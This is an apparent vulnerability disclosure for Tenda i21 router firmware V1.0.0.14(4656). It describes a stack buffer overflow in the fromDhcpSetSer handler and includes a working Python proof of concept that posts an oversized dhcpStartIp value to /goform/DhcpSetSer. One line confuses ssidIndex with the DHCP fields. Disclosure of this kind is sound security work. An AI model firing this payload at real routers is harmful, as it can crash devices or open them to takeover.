## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2982.html

## Affected version

i21 V1.0.0.14(4656)

## Vulnerability details

In the i21 V1.0.0.14(4656) firmware has a stack overflow vulnerability in the `fromDhcpSetSer` function. The `dips, dipe, dhcps_gw, dhcps_mask, dhlt, dns1, dns2` variable receives the `dhcpStartIp, dhcpEndIp, dhcpGw, dhcpMask, dhcpLeaseTime, dhcpDns1, dhcpDns2` parameter from a POST request. However, since the user can control the input of `ssidIndex`, the statement `sprintf(dhcpscfg, "%s;%s;%s;%s;%s;%s;%s;%s;%s", enable, "br0", dips, dipe, dhcps_gw, dhcps_mask, dhlt, dns1, dns2);` can cause a buffer overflow. The user-provided  `dhcpStartIp, dhcpEndIp, dhcpGw, dhcpMask, dhcpLeaseTime, dhcpDns1, dhcpDns2` can exceed the capacity of the `dhcpscfg` array, triggering this security vulnerability.

![image-20240419163146829](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240419163146829.png)

![image-20240419163135430](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240419163135430.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/DhcpSetSer"
payload = b"a"*2000

data = {"dhcpStartIp": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240419162115799](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240419162115799.png)
